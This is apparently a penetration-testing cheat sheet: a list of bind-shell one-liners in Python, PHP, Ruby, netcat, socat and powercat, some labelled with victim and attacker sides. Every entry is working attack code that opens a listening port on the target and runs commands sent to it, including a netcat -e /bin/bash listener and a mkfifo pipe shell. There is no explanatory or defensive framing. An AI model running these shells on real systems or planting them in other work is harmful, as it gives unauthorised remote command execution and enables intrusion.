```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("$ip",$port));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```python
import socket as s,subprocess as sp;

s1 = s.socket(s.AF_INET, s.SOCK_STREAM);
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);
s1.bind(("$ip", $port));
s1.listen(1);
c, a = s1.accept();

while True: 
    d = c.recv(1024).decode();
    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE);
    c.sendall(p.stdout.read()+p.stderr.read())
```

```php
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"$ip",$port);\
socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
    socket_write($cl,$m,strlen($m));}}'
```

```ruby
ruby -rsocket -e 'f=TCPServer.new($port);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
```

```nc
nc -nlvp $port -e /bin/bash
```

```nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp $port >/tmp/f
```

```socat
victim: socat TCP-LISTEN:$port,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
attacker: socat FILE:`tty`,raw,echo=0 TCP:$ip:$port 
```

```powercat
victim: powercat -l -p $port -ep
attacker: powercat -c $ip -p $port
```


